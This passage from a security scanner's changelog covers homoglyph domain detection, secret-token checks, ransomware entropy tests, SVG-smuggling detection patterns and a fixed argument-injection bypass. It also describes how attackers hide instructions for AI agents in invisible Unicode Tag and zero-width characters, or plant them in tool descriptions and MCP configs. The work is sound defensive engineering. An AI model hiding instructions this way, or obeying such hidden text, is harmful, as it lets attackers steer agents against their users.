  | Uppercase Cyrillic `РАУРАЛ.com` | ALERT 40, no brand | BLOCK 75, whole-script confusable |
  | Fullwidth `ｐａｙｐａｌ.com` | ALERT 40, no brand | BLOCK 75, confusable characters |

  - **Cherokee** (U+13A0–13F5) added to both `cp_fold()` and `cp_script()`.
    Chrome names Cherokee alongside Cyrillic and Greek as a whole-script-
    confusable script; its syllabary carries many Latin-capital look-alikes.
  - **Uppercase Cyrillic and Greek** added. The parser's `str_tolower()` only
    folds ASCII, so these reached `cp_fold()` un-lowercased and mapped to
    nothing. All new mappings return lowercase, matching the lowercase brand
    table. Only glyphs **visually identical** to their Latin counterpart are
    listed — near-misses (Б, Л, Ω, σ, γ, η) were deliberately excluded, because
    a wrong fold manufactures brand matches out of legitimate text. U+04C0
    palochka is the genuine uppercase `l` look-alike.
  - **Fullwidth (U+FF21–FF5A) and mathematical Latin (U+1D400–1D6A3)** fold as
    ranges. These are Script=Latin — compatibility variants, not a script mix —
    so they get a third, accurate label: *"Confusable characters … uses
    look-alike variant characters"*, distinct from both mixed- and whole-script.

### Fixed
- **Non-ASCII domains are no longer flagged merely for being non-ASCII.** The
  fallback advisory fired on *any* non-ASCII host, so `münchen.de` and `日本.jp`
  — ordinary internationalised domains — were reported suspicious. It now
  requires a character from a Latin-**confusable** script to actually be
  present: an accented Latin name or a wholly different script has nothing to
  be confused with. Browsers do not warn on these either. Reason text renamed
  to *"Latin-confusable script characters in domain"* to match what it means.
- **UTS #39: whole-script confusables are no longer mislabelled "mixed-script"**
  (`hlse_core.c`). Unicode Technical Standard #39 separates two classes that
  `detect_mixed_script()` collapsed into one: *mixed-script* (Latin alongside a
  confusable character, `pаypal` with one Cyrillic а) and *whole-script
  confusable* (every letter from a single non-Latin script, `раураӏ`, all
  Cyrillic). The second is the harder and more dangerous class precisely
  because the script-mixing tell is absent — browsers treat it separately —
  yet HLSE reported it as `Mixed-script homoglyph`, which was factually wrong:
  nothing was mixed.
  - Script classification now reuses the existing `cp_script()` helper that the
    Punycode detector already relied on, so both paths apply the same standard.
  - Analysis is **per-label**, the unit UTS #39 defines and the unit a registry
    issues. Judging the whole host would be meaningless: the ASCII `.com` marks
    every host as containing Latin, so the whole-script case could never fire.
  - **False-positive carve-out**: a single-script non-Latin label under a
    registry that legitimately serves that script (`.ru`, `.su`, `.ua`, `.gr`,
    `.am`, …) is ordinary internationalisation and no longer draws the generic
    advisory — mirroring the per-script TLD allow-lists Chrome and Firefox use
    before falling back to Punycode display. Mixed-script labels get no such
    pass, since no registry legitimately issues those.
  - Severity is unchanged in every attack case (brand spoofs still score 60 and
    gate non-zero); only the wording changes, plus one clearly-legitimate class
    stops being flagged. F1 stays 1.000 / 0.0% FP.
  +6 CLI-integration tests (p120).

### Added
- **Prompt-injection detection: invisible instruction carriers**
  (`hlse_text.c`). The repository description already advertised prompt-
  injection coverage; no such detector existed. An AI agent consuming a
  document reads code points, not rendered glyphs, and attackers exploit that
  gap by encoding instructions in characters that render as nothing. Unit 42
  documented this in the wild in March 2026 (ad-review evasion, system-prompt
  leakage on live platforms); prompt injection is OWASP's top LLM risk for
  2026.
  - **Unicode Tags block** (U+E0000–U+E007F) mirrors ASCII one-to-one, so a
    full English instruction encodes into it while rendering as nothing.
    Detected when tag characters exceed what legitimate RGI emoji tag
    sequences can account for (those are always introduced by U+1F3F4 and run
    at most six tag characters each). Scores 70 (BLOCK).
  - **Long zero-width runs** (U+200B/200C/200D/FEFF) used as a binary data
    channel. Keyed on *run length*, not presence, because ZWJ in emoji
    sequences and ZWNJ in Persian/Indic text are legitimate but sparse.
    Scores 40 (ALERT).
  - Runs on the raw input *before* the evasion-normalization pipeline, which
    deliberately strips these code points — normalizing first would erase the
    evidence.
  - Verified against the false-positive boundaries: ZWJ family emoji, Persian
    ZWNJ text, and all three UK subdivision flags together stay clean.
  - Applied by **`scan <dir>`** as well as `text`. The realistic path is an AI
    agent reading files out of a repository — CSA documented payloads planted
    in tool descriptions, skill files and MCP server configs — not a human
    pasting text into the CLI. Findings print with `file:line`, count toward
    `threats`, and drive the exit gate. +5 CLI-integration tests (p119).
  - **Structural only, and the blind spot now says so**: an injection written
    in ordinary visible prose is a semantic problem this does not solve, and a
    clean result is explicitly not clearance to feed untrusted content to an
    agent. +5 CLI-integration tests (p118).

- **Chi-square byte-distribution test to qualify the R2 entropy finding**
  (`hlse_util.c`, `hlse_protect.c`). Shannon entropy cannot separate
  *encrypted* from *compressed* data — both sit near 8 bits/byte — which is
  the dominant false-positive source in entropy-based ransomware detection.
  The existing magic-byte skip only covers formats with a recognisable header,
  so a headerless or unknown container still lands as "likely encrypted".
  Reproduced here: six raw-deflate files (no magic) scored entropy 7.910 vs
  7.958 for random bytes — indistinguishable — and R2 fired on the compressed
  set. Chi-square separated the same samples 546 vs 242 (uniform ~255).
  - New `hlse_chi_square_uniform()` (256 bins, df 255; returns -1 below 1280
    bytes where the statistic is not meaningful). +4 util tests (47/47).
  - **One-directional by design.** A clearly structured histogram is evidence
    of compression and is reported as such; a *uniform* histogram is NOT
    reported as evidence of encryption, because compressed data often looks
    uniform too. Measured on a single deflate stream, the statistic ran
    628 / 398 / 289 / 319 as the sample grew 2K -> 4K -> 8K -> whole file —
    non-monotonic, and overlapping the encrypted range at the 4 KB HLSE
    samples. This matches the literature (Davies et al.; and the Kent
    "Why Current Statistical Approaches to Ransomware Detection Fail"
    analysis), which reports high false-positive rates for every single
    statistic taken alone.
  - **Score-neutral**: it annotates an R2 finding that already fired and never
    raises or lowers the score, so a misread can neither manufacture nor
    suppress a ransomware verdict. F1 stays 1.000 / 0.0% FP.
  +3 CLI-integration tests (p117).

- **Offline checksum verification for GitHub-format tokens** (`hlse_util.c`,
  `hlse_secrets.c`). GitHub's token formats are `prefix_` + 30 chars of
  entropy + 6 chars of checksum, where the checksum is CRC-32 of the entropy
  encoded as 6 base62 digits (GitHub Engineering, *Behind GitHub's new
  authentication token formats*, 2021). That makes well-formedness checkable
  **without contacting GitHub**, which suits an offline-by-design scanner.
  - Previously a random 36-character string after `ghp_` was reported with
    `confidence: certain` — the shape matched, but nothing confirmed it was a
    real token. Findings now say whether the checksum actually verifies.
  - New `hlse_crc32()` (standard IEEE 802.3 / zlib, reflected 0xEDB88320) and
    `hlse_base62_6()` primitives, validated against the standard CRC-32 test
    vectors (`"123456789"` -> 0xCBF43926, empty -> 0). +4 util tests (43/43).
  - **A checksum mismatch never suppresses a finding.** The encoding is
    reconstructed from public documentation rather than validated against live
    credentials, so treating a mismatch as "not a secret" could silently drop a
    real leaked token — the one failure a secret scanner must not have. A
    mismatch reports with a caveat that the value may be redacted,
    illustrative, or mistyped. Scores are unchanged; F1 stays 1.000 / 0.0% FP.
  - `hlse_secrets.c` now depends on `hlse_util.c`; the standalone
    `secrets_tests` and `fuzz_secrets` Makefile targets were updated to link it
    (they compiled the module in isolation and would otherwise fail to link).
  +4 CLI-integration tests (p116).

- **Slopsquat honesty for unverifiable package names** (`hlse_supply.c`,
  `hlse_core.c`). HLSE's package check is Damerau-Levenshtein distance<=2
  against a curated list, so a *wholly invented* name is invisible to it by
  construction — and it previously reported a bare `OK`, indistinguishable
  from a genuinely recognised package.
  Grounded in the USENIX Security 2025 analysis of LLM package hallucinations
  (Spracklen et al.; 576k samples across 16 models), which measured ~19.7% of
  LLM-recommended packages as non-existent and found only ~13% of those were
  off-by-one typos while roughly half were *highly dissimilar* to any real
  package — precisely the class an edit-distance check cannot see.
  - An exact registry match now emits an explicit recognition line
    (`Known package: 'requests' is a recognised pip package.`), mirroring the
    URL canonical-confirmation pattern, so `OK` is no longer ambiguous.
  - An unknown, non-near-miss name now selects a distinct `package_unverified`
    blind spot that states plainly that nothing was confirmed, explains why
    typo-distance cannot catch a fabricated name, and tells the user to verify
    age/owner/downloads on the registry if the name came from an AI assistant.
  - **Scoring is deliberately unchanged** — both cases remain score 0. A
    structural "looks hallucinated" heuristic would false-positive across the
    legitimate ecosystem (`flask-login`, `google-cloud-storage`, …), and the
    research is explicit that these names are not structurally distinguishable.
    F1 stays 1.000 / 0.0% FP. +5 CLI-integration tests (p115).

### Security
- **`--` end-of-options marker; global flags no longer parsed from operand
  positions** (`hlse_core.c`). All 11 global-flag loops scanned the whole of
  `argv` "anywhere", including OPERAND positions — which carry
  attacker-influenced scan data (a URL, message, package name, clipboard
  string). Two live consequences, both reproduced:
  - `hlse_core clipboard "--log-file" "/tmp/x"` created a file from scan data.
  - More seriously, the two-token argv shift meant **the real input was never
    analysed while the process still exited 0 ("safe") — a silent detection
    bypass.** In a pipeline scanning untrusted input, a crafted value disables
    the check while appearing to pass.
  Fix: an `argc_flags` boundary bounds every flag loop, and `--` sets it so
  everything after the marker is data. Backward compatible (flags before `--`
  behave exactly as before). Found by an adversarial review commissioned for a
  different feature; the review also recommended rejecting that feature, which
  was dropped. +4 CLI-integration tests (p114).

### Fixed
- **Terminal-injection hardening in protect reasons** (`hlse_protect.c`).
  Protection reasons embed attacker-controlled filenames (ESP `.efi` names,
  ransom-note names, mutated extensions), and the plain-text CLI prints them
  straight to a terminal. A file named with an embedded ESC byte could forge or
  hide output lines. `pv_add_reason()` now neutralises control bytes (`<0x20`,
  `0x7f`) once, at the single choke point every reason passes through, covering
  all plain-text print sites; the JSON path was already safe via `json_escape`.
  Flagged by the adversarial review of the ESP reentrancy work. +1 test
  (protect 22/22).

### Added
- **Alert sink (`hlse_alert.c`) + `--syslog` / `--log-file` — push-model
  finding delivery.** A one-shot scanner returns a verdict and exits; a
  resident/daemon (and any operator who wants findings recorded) needs verdicts
  PUSHED to a durable channel. New dependency-free module writes one JSON object
  per finding to syslog (`LOG_AUTHPRIV`) and/or an append-only `0600` JSONL log.
  This is a Phase-0 foundation for the planned `hlsed` daemon, but is immediately
  useful from the CLI.
  - Reviewed adversarially before implementation; the review caught and this
    commit fixes: a stack buffer overflow in the line builder (length is now a
    clamped `size_t`, every append bounded — no unchecked `snprintf`); an
    unchecked `fchmod` that could silently defeat the `0600` confidentiality
    guarantee (now a hard error); and EINTR/partial-write handling so each
    record is one intact line.
  - Wired into **every** scan type: the default url/text auto-detect dispatch
    (from the `ScanResult`, covering all three output branches uniformly) and
    the `protect`, `file`, `secret`, `paste`, `network`, `email`, `clipboard`,
    and `package` subcommands — so `--syslog`/`--log-file` capture findings from
    any invocation, not just url/text.
  - New shared `hlse_json_escape()` in `hlse_util.c` (consolidates the escaping
    logic instead of adding a third private copy); 3 unit tests (util 39/39).
  - `--log-file` opens `O_NOFOLLOW` (a fresh operator-owned append target has no
    legitimate reason to be a symlink) + `fstat`/`S_ISREG` check.
- **Daemon Phase-0 hygiene: fixed the only memory leak + one non-reentrant
  buffer.** `hlse_baseline_clear()` frees/resets the `--baseline` fingerprint
  set (previously never freed); ESP scanning now uses a per-call heap buffer
  reused via `read_file_head()` (removing the shared static scratch and closing
  an `lstat`->`open` TOCTOU window). `make asan-test` now actually exercises
  `--baseline` and `esp` (it never did), so LeakSanitizer verifies both.
- **Ransomware: R6 intermittent/partial-encryption detection**
  (`hlse_protect.c`). Closes the Tier-2 stretch item from the same July-2026
  research sweep (arXiv 2510.15133, BlackCat-style "dot/smart/head-only"
  modes) — modern ransomware evades whole-file/head-only entropy checks by
  encrypting only a slice of each file, leaving the header looking normal.
  - `read_file_segment()`: `pread` at an arbitrary offset (reuses the same
    symlink/FIFO/regular-file safety as `read_file_head`).
  - `is_low_entropy_ext()` + `LOW_ENTROPY_EXTS[]`: restricts the check to
    text/source/config extensions, which legitimately never contain a
    >7.5 bit/byte block — unlike documents/media, which are excluded to
    avoid the false positives whole-file entropy heuristics are known for.
  - R6 fires when >= 3 such files have a low-entropy header (<6.5, size
    >= 16 KiB) but a high-entropy (>7.5) middle or tail 4 KiB segment.
    Score 30, same tier as the existing R2 whole-file entropy spike.
  - 2 new protect tests (intermittent-encryption fires; genuinely low-entropy
    text directory does not) — protect suite now 21/21.
  - Verified: 0 warnings (CLI+lib strict), F1 = 1.000 on the in-distribution
    corpus (no new false positives), ASan/UBSan clean, full `make test` at
    the same 714 passed / 14 pre-existing unrelated failures as baseline.
- **Detection: 2026 threat-research round (SVG smuggling + 2026 secret
  formats).** Grounded in a July-2026 literature/threat-intel sweep
  cross-checked against the existing engine so only genuine gaps were closed
  (design contract kept: dependency-free C, zero network, no ML).
  - **Scripted-SVG smuggling (`F5`)** — `hlse_check_file` now flags an SVG
    whose first 4 KB carries executable script (`<script>`, an inline
    `onload`/`onerror`/`onclick`/`onmouseover` handler, `<foreignObject>`, a
    `javascript:` URI, or a `;base64,` payload). SVG-in-email smuggling was
    2026's fastest-growing file-delivery vector (MITRE ATT&CK T1027.017,
    Securelist), and `.svg` was previously *excluded* from masquerade
    scoring; `F5` is extension-independent because a scripted SVG is itself
    the vehicle, and also matches XML-declared SVGs (`<?xml …?><svg>`) that
    the HTML heuristic skips. Scored 55 (ALERT). 3 tests (script-tag,
    `onload=`, benign-chart-not-flagged); the `svg_has_script` scan is a
    bounded, NUL-terminated 4 KB pass.
  - **2026 secret token formats** — added the still-missing entries from the
    GitHub Mar-2026 secret-scanning batch: Supabase `sbp_`/`sb_secret_`,
    Figma `figd_`, PostHog `phx_`, LangSmith `lsv2_pt_`/`lsv2_sk_`. Each
    prefix is vendor-reserved (≈zero FP); intentionally-public keys
    (Supabase `sb_publishable_`, PostHog `phc_`) are omitted. Reuses the
    existing placeholder filter. 2 tests (6 formats detected; a 2026-prefix
    placeholder still excluded).
  - Verified: 0 warnings (CLI + library strict builds); secrets tests 66/66,
    file/audit tests 36/36; F1 = 1.000 on both in- and out-of-distribution
    corpora (no new false positives on benign SVGs/images); secrets fuzz
    100K + ASan clean; full `make test` shows the same 714 passed / 14
    pre-existing unrelated failures as before.
- **Web dashboard + HTTP API (`hlse-server`) — commercial-grade frontend to
  backend on top of the existing engine.** A small, dependency-free HTTP/1.1
  server (POSIX sockets + libc only; no third-party runtime) exposes the
  detection engine over JSON and serves a local, responsive, light/dark web
  dashboard for scanning URLs, messages, and code/config for leaked secrets.
  - Endpoints: `GET /api/v1/health`, `GET /api/v1/version`,
    `POST /api/v1/scan/{url,text,secrets,file}`. Verdicts come from the same
    `hlse_scan()` / `hlse_scan_secrets()` / `hlse_check_filename()` the CLI
    uses — no forked logic. `/scan/file` combines name-based masquerade
    detection with a leaked-secret content scan.
  - Access logging: each request is logged as `METHOD path -> status`.
  - End-to-end smoke test `tests/server_integration.sh` (14 checks, exposed as
    `make server-check`) plus the unit tests for the JSON parser/escaper.
  - Hardening: loopback bind by default, 64 KiB request-body cap, static
    assets via a fixed 3-route allowlist (path traversal structurally
    impossible), and CSP / `X-Content-Type-Options` / `X-Frame-Options` /
    `Referrer-Policy` headers on every response. GET/HEAD/POST only.
  - New files: `hlse_server.c`, `web/{index.html,app.js,style.css}`,
    `docs/API.md`, and `tests/hlse_server_tests.c` (11 unit tests for the
    untrusted JSON request parser and output escaper — the security-critical
    surface). Wired into `make` (`server` target, built by `all`, run by
    `test`) and `.gitignore`.
  - **Concurrency**: refactored to one detached pthread per connection
    (previously a single-threaded accept loop), capped at 64 simultaneous
    connections — a burst beyond the cap gets an immediate `503
    Service Unavailable` (`Retry-After: 1`) from the accept loop with no
    thread spawned, so it can't exhaust memory or file descriptors. Safe
    because every handler only reads `static const` engine tables
    (`hlse_scan()` / `hlse_scan_secrets()` / `hlse_check_filename()` are
    documented thread-safe) and all per-request state now lives in a
    stack-allocated `ConnCtx` — the prior per-request globals (log
    method/path/status, HEAD-suppress flag) were removed, eliminating the
    data races they would otherwise have under concurrent connections.
    Verified with a 30-way concurrent request burst (all succeed, ~70ms
    total) and a 70-socket saturation test confirming the `503` path
    triggers at the cap and recovers once slots free up.
  - **Packaging**: `make install`/`uninstall` now install `hlse-server`
    alongside the CLI. The installed binary is rebuilt with
    `HLSE_DEFAULT_WEBROOT` baked in as `$(PREFIX)/share/hlse/web` (the
    dashboard assets are installed there too), so `hlse-server` run from any
    directory after installation finds its assets — the plain in-repo
    `make server` build is unaffected and still defaults to `./web`.
    Added `hlse-server.1` man page (endpoints, concurrency model, examples),
    installed to `$(MANDIR)`. Verified round-trip in an isolated `PREFIX`:
    install → server run from an unrelated cwd serves the dashboard and API
    correctly → `uninstall` leaves the prefix empty.
  - Fixed the man page's `SEE ALSO` link, which pointed to
    `.../blob/main/docs/API.md` — a 404 until this branch merges, since that
    file only exists here. Replaced with a plain source-file reference plus
    the repository home page.
  - **Rate limiting**: per-source-IP fixed-window counter (300 requests per
    60s), checked in the accept loop before a thread is spawned or the
    detection engine runs. A source over the limit gets `429 Too Many
    Requests` with `Retry-After: 60`, logged as `RATE-LIMIT <ip> -> 429`.
    Defense-in-depth against a single runaway or abusive source; complements
    the existing `MAX_CONCURRENT` connection cap, which bounds simultaneous
    connections but not a sustained low-concurrency request flood from one
    IP. Implemented as a small mutex-guarded fixed-size table (256 buckets)
    to keep the logic auditable at this connection scale. 4 new unit tests
    (fresh-IP allowed, burst-at-limit allowed, over-limit rejected, per-IP
    isolation) — server unit tests now 15/15; verified live with a 305-request
    burst against a running server (299 succeed, 6 rejected with `429` +
    correct `Retry-After`, recovering after the window).
  - **`tests/hlse_server_fuzz.c`**: a 6th fuzz harness (`make fuzz`/
    `make fuzz-asan`), closing the one gap left by the round above — the
    server's JSON request parser (`json_get_string`) and output escaper
    (`json_escape_append`) are the only code in HLSE that consumes bytes
    directly from a network peer, so they now get the same fuzzing rigor as
    the URL/text/secrets/supply/file modules. Random bytes, adversarial
    JSON-like fragments (unbalanced braces, invalid `\u` escapes, truncated
    strings), and well-formed JSON generators; checks for crashes and an
    unterminated-output invariant. 100K plain + 10K ASan iterations, 0
    crashes, 0 invariant failures.

### Fixed (repo hygiene / documentation audit)
- Re-removed `files (1).zip` (a stale 1.1 MB v0.5.0 prebuilt-binary release
  artifact) and added `*.zip`/`*.tar.gz`/`*.tar.bz2`/`*.dSYM/` to
  `.gitignore`. This had been fixed once already in an earlier session, but
  that fix was on a commit discarded when the branch was re-synced to a
  parallel, more-advanced tip that never had it — recorded here so it
  doesn't get silently re-lost the same way again.
- `hlse.1` (the CLI man page)'s `.TH` version stamp was `"HLSE 0.9.15"` dated
  `2026-06-08` — many releases stale against the actual `HLSE_VERSION`
  (`1.0.113`). Bumped to match.
- Corrected internally-inconsistent test/fuzz counts: `README.md` claimed
  "460" structured tests and CONTRIBUTING.md claimed "320+" — neither traced
  to the actual current totals (9 unit suites summing to 327 cases + 29
  extended-corpus cases + 728 CLI-integration assertions = 1084+). Also
  fixed the fuzz-harness count (both docs said 4-5; actual is 6 after this
  round's addition) and added the missing `server`/`url` mentions to
  CONTRIBUTING's axis and gate tables.
- `Makefile`'s `clean` target was missing `$(FUZZ_URL)`/`$(FUZZ_URL_ASAN)`
  (pre-existing gap, found while wiring in the new server fuzz targets) —
  added alongside the new `$(FUZZ_SERVER)`/`$(FUZZ_SERVER_ASAN)`.

## [1.0.113] — 2026-07-04

### Changed
- **Perspective 113 (roadmap P2-12 + E-2): release-engineering maturity —
  real `release.yml` with checksums/SBOM/version-gating, and the
  donation-address cleanup a commercial-gap procurement review flagged.**

  **E-2 (donation address)**: an unexplained cryptocurrency address embedded
  in a security tool's compiled binary and every source file's header
  comment is, in a procurement/supply-chain review, indistinguishable from
  a compromise indicator — worse, the README labeled it "Cryptographic
  identity hash for maintainer verification," which is not an accurate
  description of what a Bitcoin address is or does (there is no signature
  scheme tying it to commits or releases). Fixed:
  - Removed `Identity: bitcoin:...` from `--version` output and from the
    header comments of all 6 source files that carried it (one also
    referenced a `MAINTAINER.md` that has never existed in this repo).
  - Added `.github/FUNDING.yml` — the standard, GitHub-recognized location
    for a project's donation address — and replaced the README's
    "Identity anchor" section with an accurate "Support the project" one.
  - `SECURITY.md` went further than README: it claimed security advisories
    are "signed against" the address and told users to distrust anything
    that isn't — an unverifiable claim, since no signing or verification
    tooling exists anywhere in this repo. Replaced with a plain statement
    that advisories are published only through GitHub's official channels.
    Its "Supported versions" table was also still listing pre-1.0 `0.6.x`/
    `0.7.x` ranges with nothing to do with the current `1.0.x` line; fixed
    to describe the actual (single-latest-version) support policy.
  - `CONTRIBUTING.md` directly *contradicted* the FUNDING.yml fix, stating
    "This is a cryptographic identity hash, not a donation address" — one
    more sign this narrative was never backed by an actual mechanism.
    Replaced with a plain pointer to `FUNDING.yml`.

  **P2-12 (release engineering)**: `release.yml` did not exist at all. Added
  a tag-triggered (`v[0-9]+.[0-9]+.[0-9]+`) workflow that:
  - Verifies the git tag matches the compiled-in `HLSE_VERSION` before doing
    anything else — a release is never published under a mismatched version.
  - Builds and gates on `make test` + `make check-warnings` + F1=1.000 on
    the corpus benchmark — the same bar every commit meets, not a shortcut.
  - Stages the CLI binary, static binary, shared library, public headers,
    man page, and JSON schemas; generates a `SHA256SUMS` checksum file and a
    minimal hand-written CycloneDX 1.5 SBOM (accurate by construction — HLSE
    has zero third-party dependencies beyond the system libc/libm).
  - Publishes a GitHub Release with these artifacts attached.

  Caught and fixed during implementation: the first checksum-generation
  draft (`find . -type f | ... | xargs sha256sum > SHA256SUMS`) hashed its
  own output file — the shell creates/truncates the redirect target *before*
  the pipeline runs, so `find` saw and hashed the empty `SHA256SUMS`,
  producing a checksum that was wrong the instant real content was written.
  Fixed with `find . -type f -not -name SHA256SUMS`; verified locally with a
  full `sha256sum -c` pass.

  Pure metadata/docs/CI change — no detection logic, score, or threshold
  touched (F1=1.000 preserved).

  - **Tests**: 9 new CLI integration tests — `--version` no longer leaks the
    address, no source file references it, `FUNDING.yml` carries it
    instead, `release.yml` exists/validates/gates correctly, the
    unverifiable "signed against" claim and stale version table are gone
    from `SECURITY.md`/`CONTRIBUTING.md`, and an F1-invariant check
    (728 total).

  **Known limitation**: `.github/workflows/release.yml` (and the
  pre-existing `ci.yml`/`codeql.yml`, which were present in this working
  tree but had never actually reached a remote branch) could not be pushed
  in this session — the CI bot's GitHub App token lacks the `workflows`
  permission scope GitHub requires to create or update files under
  `.github/workflows/`. The files exist on disk and pass all local tests
  above, but a repository maintainer with the right token/permissions
  needs to add them directly (e.g. via the GitHub web UI, or a token with
  the `workflows` scope) before the CI/release automation they describe
  actually runs.

## [1.0.112] — 2026-07-02

### Added
- **Perspective 112 (roadmap P1-6): `--patterns <file>` gains a `BRAND`
  directive — protect an organization's own name and executives from BEC/
  CEO-fraud impersonation without a rebuild.**

  The commercial-gap audit noted the built-in email display-name-vs-domain
  mismatch check (E1) only knows major consumer brands (Microsoft, PayPal,
  ...) — an organization could never protect its own name or executives from
  impersonation without recompiling. Extends the `--patterns` config format
  (introduced in P0-3 for custom secret patterns) with a second directive:
  ```
  BRAND <name> <owned_domain1>[,<owned_domain2>...]
  ```
  Registered via a new `hlse_register_custom_brand()` API in
  `hlse_secrets.h`/`.c`, checked by the *exact same* E1 logic (score +45,
  identical reason format) as the built-in brand table: if `<name>` appears
  in a From display name but the sending domain matches none of the
  registered owned domains, it fires — e.g. `BRAND acmecorp
  acmecorp.com,acme-corp.com` flags "Acme Corp Finance" emailing from an
  attacker's domain but not from either registered domain.

  Fixed during implementation: the initial parser read `<name>` with a
  single `%s` token, so it silently truncated at the first space — but real
  organization names commonly contain spaces ("Acme Corp", not "AcmeCorp").
  Rewrote the line parser to split from the end of the line (the domain
  list is always the last whitespace-delimited token, comma-separated with
  no internal spaces), so `<name>` can itself contain spaces, matching how
  the built-in table already handles multi-word entries ("office 365",
  "human resources") via the same `contains_word()` matcher.

  Purely additive — no built-in detection logic, score, or threshold
  touched. `--benchmark` never registers custom brands, so F1=1.000 is
  unaffected by construction.

  - **Docs**: `--help`, `hlse.1`, and `examples/custom-patterns.example`
    document the `BRAND` directive.
  - **Tests**: 12 new CLI integration tests — detection on/off without the
    flag, owned-domain (primary and alternate) suppression, CLI plaintext,
    malformed-line resilience, an unrelated-email no-op check, a built-in-
    brand F1-invariant check, and the multi-word-name parsing fix
    (719 total).

## [1.0.111] — 2026-07-02

### Added
- **Perspective 111 (roadmap P0-2, the last remaining P0): `scan <dir>
  --git-history` scans every commit ever made to a repository, not just the
  working tree.**

  The commercial-gap audit identified this as the primary use case for
  commercial secret scanners (gitleaks/trufflehog) that HLSE lacked
  entirely: a credential that was committed and later deleted (`git rm`) is
  still readable by anyone who clones the repository, but a working-tree-
  only scan never sees it. Verified end-to-end: a repo where a secret was
  added in one commit and removed in the next scores clean under plain
  `scan .` (0 threats) but is correctly flagged under `scan . --git-history`
  (ISOLATE, the original commit and path identified).

  Implementation: streams `git log --all -p --no-color --full-history`
  through **one** subprocess for the entire history (not one per commit or
  blob — keeps it fast on large repos) and scans only added ('+') lines,
  the moment each credential entered history, using the exact same
  `hlse_scan_secrets()` used everywhere else. Spawned via `fork()` +
  `execlp()`, never `popen()`/`system()`: the directory path is passed as a
  discrete argv element to `git`, so it is never interpreted by a shell and
  no path can inject a command. `git log` performs no network I/O (only
  `fetch`/`pull`/`clone` do), so this does not affect HLSE's zero-network-
  calls guarantee — verified by the existing CI privacy tripwire, which
  traces socket-family syscalls, not process spawns.

  Fully integrated with the existing scan infrastructure: `--json`, `--sarif`,
  `--baseline`, `--fingerprints`, and inline `hlse:allow` all work identically
  to a normal `scan`. A non-git directory is a usage error (exit 2) rather
  than a misleading "0 commits, clean" result; an empty-but-valid repo
  correctly distinguishes as clean (exit 0).

  Scoped to secrets (the dominant real-world case for history scanning, and
  what gitleaks/trufflehog both focus on); file-masquerade and embedded-URL
  checks remain working-tree-only for now.

  No detection logic, score, or threshold touched — F1=1.000 preserved.

  - **Docs**: `docs/SIEM_INTEGRATION.md` §5b, `--help`, and `hlse.1` document
    the new flag.
  - **Tests**: 13 new CLI integration tests using a real, disposable git
    repo — working-tree-clean-but-history-dirty verification, JSON/SARIF/
    fingerprint/baseline coverage, non-git and empty-repo edge cases, and an
    F1-invariant check (707 total).

## [1.0.110] — 2026-07-02

### Added
- **Perspective 110 (roadmap P0-3): `--patterns <file>` registers custom
  organization-specific secret patterns without a rebuild.**

  The commercial-gap audit (vs gitleaks.toml / detect-secrets plugins /
  GitGuardian custom detectors) found every credential pattern was compiled
  into a fixed C table — an organization's internal token formats (internal
  PKI, home-grown API keys, legacy deploy tokens) could never be taught to
  HLSE without recompiling from source, which is incompatible with a binary
  distribution model. `--patterns <file>` closes this: a small, non-regex
  config format registers additional prefix + charset + length patterns at
  runtime, checked by `hlse_scan_secrets()` using the *exact same* matching
  and placeholder/example-value suppression logic as the built-in table.

  File format (one directive per line; `#` comments and blanks ignored):
  ```
  SECRET <prefix> <min_suffix> <charset> <score> <label...>
  ```
  `charset` is one of `alnum | alnum_dash | hex | alpha | digit`; `label` is
  free text to end of line. A malformed line is skipped with a stderr
  warning (the rest of the file still loads); an unreadable file is a usage
  error (exit 2). Applies globally — `secret`, `scan`, and every other
  subcommand that scans text honor `--patterns` once loaded.

  New public library API in `hlse_secrets.h`:
  `hlse_register_custom_secret_pattern()`, `hlse_clear_custom_secret_patterns()`,
  `hlse_custom_secret_pattern_count()`, and the `HlseCharset` enum — usable
  directly by `libhlse.so` consumers, not just the CLI.

  Purely additive — no built-in detection logic, score, or threshold
  touched. `--benchmark` never passes `--patterns`, so F1=1.000 is
  unaffected by construction, not just by testing. A custom finding's
  `pattern_id` falls back to the existing `HLSE-SECRET-GENERIC` append-only
  token (no new token minted for a user-defined type).

  - **New**: `examples/custom-patterns.example` — a documented, runnable
    example file.
  - **Docs**: `--help` and the man page (`hlse.1`) document the format.
  - **Tests**: 10 new CLI integration tests — detection on/off without the
    flag, configured-score verification, JSON `pattern_id` fallback,
    built-in patterns unaffected, `scan` honoring the flag, malformed-line
    resilience, unreadable-file usage error, and an F1-invariant check
    (696 total).

## [1.0.109] — 2026-07-02

### Added
- **Perspective 109 (roadmap P2-1): SARIF output for `package --manifest`.**

  The commercial-gap audit noted SARIF (GitHub Code Scanning) was emitted for
  only the three `scan` rules. A manifest typosquat maps naturally to Code
  Scanning — it is a repo file (`requirements.txt` / `package.json`) with a
  line number — so `package --manifest --sarif` now emits it. A new
  `package-typosquat` SARIF rule (security-severity 7.0, CWE-1357
  "Improper Neutralization of Dependencies") joins the existing three; each
  result carries the manifest path, the line the dependency was declared on,
  and the stable `HLSE-PKG-TYPOSQUAT` pattern_id in `properties.pattern_id`.

  Reuses the existing `sarif_add()`/`sarif_emit()` infrastructure — no scoring
  change (F1=1.000 preserved); `scan --sarif` output is unchanged apart from
  the extra rule definition in the shared rule table.

  (System `audit` findings were considered but deferred: they describe host
  configuration, not repo files, so they do not map cleanly onto Code
  Scanning's repo-file model.)

  - **Docs**: `docs/SIEM_INTEGRATION.md` documents the new rule and the
    `package --manifest --sarif` invocation.
  - **Tests**: 3 new CLI integration tests — manifest SARIF emits the rule +
    result at the right line, a clean manifest emits a valid empty-results
    doc, and `scan --sarif` still validates after the rule-table change
    (686 total).

## [1.0.108] — 2026-07-02

### Added
- **Perspective 108 (roadmap P1-8): `package --manifest <file>` scans every
  dependency in a manifest, not one name at a time.**

  The commercial-gap audit (vs socket.dev/Snyk/OSV-Scanner) noted the
  single-name `package <name>` check is impractical for real projects — no one
  hand-checks each dependency. `package --manifest <file>` now runs the
  existing typosquat detector over every declared dependency in a
  `requirements.txt` (pip) or `package.json` (npm); ecosystem is inferred from
  the filename or given explicitly (pip|npm|cargo|go|gem).

  - The pip parser extracts the leading package name from each requirement
    line, skipping comments, blanks, and pip options (`-r`, `-e`, `--`).
  - The npm parser extracts dependency names from `dependencies` /
    `devDependencies` / `peerDependencies` / `optionalDependencies` objects,
    handling both the canonical one-dep-per-line layout and the compact
    single-line object form, and correctly ignoring top-level fields like
    `name`/`version`.
  - Emits one verdict per suspicious (score >= 40) package plus a
